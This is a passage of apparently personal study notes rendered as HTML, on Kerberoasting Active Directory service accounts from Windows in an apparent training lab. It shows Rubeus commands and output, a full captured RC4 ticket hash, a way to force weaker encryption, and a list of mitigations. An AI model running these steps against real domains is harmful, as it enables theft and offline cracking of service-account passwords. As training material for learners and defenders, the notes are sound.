+<span class="p">|</span>  <span class="n">__</span>  <span class="p">/|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  <span class="n">_</span> <span class="p">\|</span> <span class="n">___</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|/</span><span class="n">___</span><span class="p">)</span>
+<span class="p">|</span> <span class="p">|</span>  <span class="p">\</span> <span class="p">\|</span> <span class="p">|</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">___</span> <span class="p">|</span>
+<span class="p">|</span><span class="n">_</span><span class="p">|</span>   <span class="p">|</span><span class="n">_</span><span class="p">|</span><span class="n">____</span><span class="p">/|</span><span class="n">____</span><span class="p">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="p">/(</span><span class="n">___</span><span class="p">/</span>
+
+<span class="n">v2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span>
+
+
+<span class="p">[*]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Kerberoasting</span>
+
+<span class="p">[*]</span> <span class="n">Listing</span> <span class="n">statistics</span> <span class="n">about</span> <span class="n">target</span> <span class="n">users</span><span class="p">,</span> <span class="n">no</span> <span class="n">ticket</span> <span class="n">requests</span> <span class="n">being</span> <span class="n">performed</span><span class="p">.</span>
+<span class="p">[*]</span> <span class="n">Target</span> <span class="n">Domain</span>          <span class="p">:</span> <span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span>
+<span class="p">[*]</span> <span class="n">Searching</span> <span class="n">path</span> <span class="s1">&#39;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#39;</span> <span class="k">for</span> <span class="s1">&#39;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#39;</span>
+
+<span class="p">[*]</span> <span class="n">Total</span> <span class="n">kerberoastable</span> <span class="n">users</span> <span class="p">:</span> <span class="n">9</span>
+
+
+<span class="p">------------------------------------------------------------</span>
+<span class="p">|</span> <span class="n">Supported</span> <span class="n">Encryption</span> <span class="nb">Type </span>                       <span class="p">|</span> <span class="n">Count</span> <span class="p">|</span>
+<span class="p">------------------------------------------------------------</span>
+<span class="p">|</span> <span class="n">RC4_HMAC_DEFAULT</span>                                 <span class="p">|</span> <span class="n">7</span>     <span class="p">|</span>
+<span class="p">|</span> <span class="n">AES128_CTS_HMAC_SHA1_96</span><span class="p">,</span> <span class="n">AES256_CTS_HMAC_SHA1_96</span> <span class="p">|</span> <span class="n">2</span>     <span class="p">|</span>
+<span class="p">------------------------------------------------------------</span>
+
+<span class="p">----------------------------------</span>
+<span class="p">|</span> <span class="n">Password</span> <span class="n">Last</span> <span class="nb">Set </span><span class="n">Year</span> <span class="p">|</span> <span class="n">Count</span> <span class="p">|</span>
+<span class="p">----------------------------------</span>
+<span class="p">|</span> <span class="n">2022</span>                   <span class="p">|</span> <span class="n">9</span>     <span class="p">|</span>
+<span class="p">----------------------------------</span>
+</pre></div>
+</div>
+</section>
+<section id="example-1-looking-for-high-value-targets">
+<h3>Example 1:  Looking for high value targets:<a class="headerlink" href="#example-1-looking-for-high-value-targets" title="Link to this heading"></a></h3>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">ldapfilter</span><span class="p">:</span><span class="s1">&#39;admincount=1&#39;</span> <span class="p">/</span><span class="n">nowrap</span>
+
+<span class="n">______</span>        <span class="n">_</span>
+<span class="p">(</span><span class="n">_____</span> <span class="p">\</span>      <span class="p">|</span> <span class="p">|</span>
+<span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
+<span class="p">|</span>  <span class="n">__</span>  <span class="p">/|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  <span class="n">_</span> <span class="p">\|</span> <span class="n">___</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|/</span><span class="n">___</span><span class="p">)</span>
+<span class="p">|</span> <span class="p">|</span>  <span class="p">\</span> <span class="p">\|</span> <span class="p">|</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">___</span> <span class="p">|</span>
+<span class="p">|</span><span class="n">_</span><span class="p">|</span>   <span class="p">|</span><span class="n">_</span><span class="p">|</span><span class="n">____</span><span class="p">/|</span><span class="n">____</span><span class="p">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="p">/(</span><span class="n">___</span><span class="p">/</span>
+
+<span class="n">v2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span>
+
+
+<span class="p">[*]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Kerberoasting</span>
+
+<span class="p">[*]</span> <span class="n">NOTICE</span><span class="p">:</span> <span class="n">AES</span> <span class="n">hashes</span> <span class="n">will</span> <span class="n">be</span> <span class="n">returned</span> <span class="k">for</span> <span class="n">AES-enabled</span> <span class="n">accounts</span><span class="p">.</span>
+<span class="p">[*]</span>         <span class="n">Use</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">X</span> <span class="n">or</span> <span class="p">/</span><span class="n">tgtdeleg</span> <span class="n">to</span> <span class="n">force</span> <span class="n">RC4_HMAC</span> <span class="k">for</span> <span class="n">these</span> <span class="n">accounts</span><span class="p">.</span>
+
+<span class="p">[*]</span> <span class="n">Target</span> <span class="n">Domain</span>          <span class="p">:</span> <span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span>
+<span class="p">[*]</span> <span class="n">Searching</span> <span class="n">path</span> <span class="s1">&#39;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#39;</span> <span class="k">for</span> <span class="s1">&#39;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))&#39;</span>
+
+<span class="p">[*]</span> <span class="n">Total</span> <span class="n">kerberoastable</span> <span class="n">users</span> <span class="p">:</span> <span class="n">3</span>
+
+
+<span class="p">[*]</span> <span class="n">SamAccountName</span>         <span class="p">:</span> <span class="n">backupagent</span>
+<span class="p">[*]</span> <span class="n">DistinguishedName</span>      <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">BACKUPAGENT</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">Service</span> <span class="n">Accounts</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">Corp</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">INLANEFREIGHT</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">LOCAL</span>
+<span class="p">[*]</span> <span class="n">ServicePrincipalName</span>   <span class="p">:</span> <span class="n">backupjob</span><span class="p">/</span><span class="n">veam001</span><span class="p">.</span><span class="n">inlanefreight</span><span class="p">.</span><span class="n">local</span>
+<span class="p">[*]</span> <span class="n">PwdLastSet</span>             <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">15</span><span class="p">/</span><span class="n">2022</span> <span class="n">2</span><span class="p">:</span><span class="n">15</span><span class="p">:</span><span class="n">40</span> <span class="n">PM</span>
+<span class="p">[*]</span> <span class="n">Supported</span> <span class="n">ETypes</span>       <span class="p">:</span> <span class="n">RC4_HMAC_DEFAULT</span>
+<span class="p">[*]</span> <span class="n">Hash</span>                   <span class="p">:</span> <span class="nv">$krb5tgs$23</span><span class="p">$*</span><span class="n">backupagent</span><span class="nv">$INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span><span class="nv">$backupjob</span><span class="p">/</span><span class="n">veam001</span><span class="p">.</span><span class="n">inlanefreight</span><span class="p">.</span><span class="n">local</span><span class="nv">@INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">*</span><span class="nv">$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E</span>
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Kerberoasting prefers RC4 encryption (type 23) other encryptions are much harder to crack.</p>
+</div>
+<table class="docutils align-left" id="id1">
+<caption><span class="caption-text">Encryption Types</span><a class="headerlink" href="#id1" title="Link to this table"></a></caption>
+<colgroup>
+<col style="width: 20.0%" />
+<col style="width: 20.0%" />
+<col style="width: 60.0%" />
+</colgroup>
+<thead>
+<tr class="row-odd"><th class="head"><p>type</p></th>
+<th class="head"><p>number</p></th>
+<th class="head"><p>Description</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p>RC4</p></td>
+<td><p>type 23</p></td>
+<td><p>The prefered method for Kerberoasting $krb5tgs$23$*</p></td>
+</tr>
+<tr class="row-odd"><td><p>AES-256</p></td>
+<td><p>type 18</p></td>
+<td><p>$krb5tgs$18$* Difficult to crack</p></td>
+</tr>
+<tr class="row-even"><td><p>AES-128</p></td>
+<td><p>Type 17</p></td>
+<td><p>$krb5tgs$17$* Difficult to crack</p></td>
+</tr>
+</tbody>
+</table>
+<p>Example 1:  Targeting a user and asking for a weak hash with <cite>/tgtdeleg</cite></p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span>  <span class="p">/</span><span class="n">tgtdeleg</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">testspn</span> <span class="p">/</span><span class="n">nowrap</span>
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Requesting a weaker password does not work on a domain controller 2019 or newer, they always default to the strongest level of encryption enabled by that account.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>If you have the privileges, you can edit the registry and set a lower encryption level. ` Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options`
+and double clicking the <cite>Network security: Configure encryption types allowed for Kerberos</cite> and set it to <cite>RC4_HMAC_MD5</cite></p>
+</div>
+</section>
+</section>
+<section id="checking-to-see-what-encryption-type-is-enabled">
+<h2>Checking to see what encryption type is enabled<a class="headerlink" href="#checking-to-see-what-encryption-type-is-enabled" title="Link to this heading"></a></h2>
+<p>The following command will show which (if any) encryption is enabled.  If it displays 0
+then none is defined and will default to RC4_HMAC_MD5. See this <a class="reference external" href="https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797">https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797</a>
+for information on non-0 settings.</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Get-DomainUser</span> <span class="n">testspn</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="n">msds-supportedencryptiontypes</span>
+
+<span class="n">serviceprincipalname</span>                   <span class="n">msds-supportedencryptiontypes</span> <span class="n">samaccountname</span>
+<span class="p">--------------------</span>                   <span class="p">-----------------------------</span> <span class="p">--------------</span>
+<span class="n">testspn</span><span class="p">/</span><span class="n">kerberoast</span><span class="p">.</span><span class="n">inlanefreight</span><span class="p">.</span><span class="n">local</span>                            <span class="n">0</span> <span class="n">testspn</span>
+</pre></div>
+</div>
+</section>
+<section id="mitigations-for-kerberoasting">
+<h2>Mitigations for Kerberoasting<a class="headerlink" href="#mitigations-for-kerberoasting" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Setting non-managed service accounts to long complex passwords.</p></li>
+<li><p>Using MSA (<a class="reference external" href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009">https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009</a>)</p></li>
+<li><p>Using group management with gMSA (<a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview">https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview</a>)</p></li>
+<li><p>Using <a class="reference internal" href="../../tags/laps.html#laps"><span class="std std-ref">laps</span></a></p></li>
+<li><p>Audit kerberose tickets (<a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview">https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview</a>)</p></li>
+<li><p>Please see this post on detection (<a class="reference external" href="https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</a>)</p></li>
+</ul>
+</section>
+<section id="references">
+<h2>References<a class="headerlink" href="#references" title="Link to this heading"></a></h2>
+<p><a class="reference external" href="https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797">https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797</a>
+<a class="reference external" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="Kerberoasting%20-%20from%20Linux.html" class="btn btn-neutral float-left" title="Kerberoasting - from Linux" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="Access%20Control%20List%20%28ACL%29%20Abuse%20Primer.html" class="btn btn-neutral float-right" title="Access Control List (ACL) Abuse Primer" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2024, CelestialTech.ca.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
